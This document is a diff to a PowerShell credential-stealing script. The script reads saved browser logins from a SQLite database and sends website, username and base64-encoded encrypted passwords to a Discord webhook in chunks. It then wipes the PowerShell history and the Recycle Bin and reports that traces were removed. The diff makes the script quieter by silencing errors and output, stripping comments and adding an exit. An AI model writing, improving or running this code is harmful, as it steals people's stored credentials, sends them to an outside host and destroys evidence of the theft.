@@ -15,9 +15,9 @@ function Send-MessageToDiscord {
     }
 
     try {
-        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $body -Headers $headers
+        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $body -Headers $headers | Out-Null
     } catch {
-        Write-Host "Error sending message to Discord webhook: $_"
+        Out-Null
     }
 }
 
@@ -45,33 +45,23 @@ $_ = [W]::P($d, "SELECT * FROM logins WHERE blacklisted_by_user = 0", -1, [ref]$
 
 for (; !([W]::S($s) % 100);) {
     $l += [W]::T($s, 0), [W]::T($s, 3)
-    $c = [W]::B($s, 5)  # Encrypted password
-
-    # No decryption logic here; just send the encrypted password
-    $encryptedPasswordBase64 = [Convert]::ToBase64String($c)  # Convert encrypted password to base64 for readability
-
-    # Append the information to be sent
+    $c = [W]::B($s, 5)
+    $encryptedPasswordBase64 = [Convert]::ToBase64String($c)
     $l += "Website: $( [W]::T($s, 0) ), Username: $( [W]::T($s, 3) ), Encrypted Password (Base64): $encryptedPasswordBase64"
 }
 
-# Convert the message into a single string
 $allCredentialsMessage = $l -join "`n"
 
-# Max length for Discord message (Discord API limit is 2000 characters)
 $maxLength = 2000
-
-# Split the message into chunks if it exceeds the max length
 $chunks = [System.Collections.ArrayList]@()
 while ($allCredentialsMessage.Length -gt $maxLength) {
     $chunks.Add($allCredentialsMessage.Substring(0, $maxLength))
     $allCredentialsMessage = $allCredentialsMessage.Substring($maxLength)
 }
-$chunks.Add($allCredentialsMessage)  # Add the remaining part of the message
+$chunks.Add($allCredentialsMessage)
 
-# Send each chunk as a separate message with a delay to avoid rate limits
 foreach ($chunk in $chunks) {
     Send-MessageToDiscord $chunk
-    # Add a random delay between 1 and 2 seconds to avoid rate limits
     Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 2)
 }
 
@@ -83,3 +73,4 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 Send-MessageToDiscord "Cleanup completed. Traces removed."
+exit
